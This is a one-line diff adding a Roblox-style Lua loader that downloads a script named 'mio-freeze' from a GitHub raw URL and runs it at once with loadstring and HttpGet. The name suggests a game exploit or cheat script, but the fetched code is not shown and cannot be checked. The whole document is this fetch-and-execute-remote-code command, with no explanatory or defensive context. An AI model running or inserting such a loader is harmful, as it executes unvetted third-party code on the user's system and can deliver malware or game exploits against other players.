@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/anhem6825-hub/mio-freeze/refs/heads/main/main.lua"))()
